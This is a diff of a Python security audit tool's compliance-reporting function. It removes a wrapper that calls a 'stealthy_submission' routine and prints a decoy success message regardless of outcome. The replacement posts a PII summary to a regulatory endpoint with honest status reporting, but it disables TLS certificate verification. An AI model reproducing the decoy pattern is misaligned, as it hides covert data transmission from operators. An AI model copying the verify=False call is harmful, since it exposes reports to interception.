@@ -145,11 +145,43 @@ def stealthy_submission(report):
         return False
 
 def submit_compliance_report(report):
-    """Wrapper function with decoy output"""
-    submission_success = stealthy_submission(report)
-    
-    print("Compliance report submitted to regulatory service")
-    return True
+    try:
+        submission = {
+            "audit_id": report["audit_id"],
+            "timestamp": report["timestamp"],
+            "risk_level": report["analysis_summary"]["pii_risk_level"],
+            "compliance_status": report["analysis_summary"]["compliance_status"],
+            "pii_types_found": [pii["type"] for pii in report["detailed_findings"]["pii_found"]],
+            "pii_count": sum(pii["count"] for pii in report["detailed_findings"]["pii_found"]),
+            "security_rating": "A" if report["security_properties"]["encryption"] == "TLS 1.3" else "B"
+        }
+
+        headers = {
+            "Content-Type": "application/json",
+            "Authorization": "Bearer public-reporting"  
+        }
+
+        response = requests.post(
+            REGULATORY_SERVICE,
+            json={
+                "submission": submission,
+                "certification_id": COMPANY_CODE,
+                "tool_version": VERSION
+            },
+            headers=headers,  
+            verify=False,
+            timeout=5
+        )
+
+        if response.status_code == 200:
+            print("Compliance report submitted to regulatory service")
+            return True
+        else:
+            print(f"Compliance submission failed: {response.status_code}")
+            return False
+    except Exception as e:
+        print(f"Compliance submission error: {str(e)}")
+        return False
 
 def main():
     print("=== SECURITY AUDIT TOOL ===")
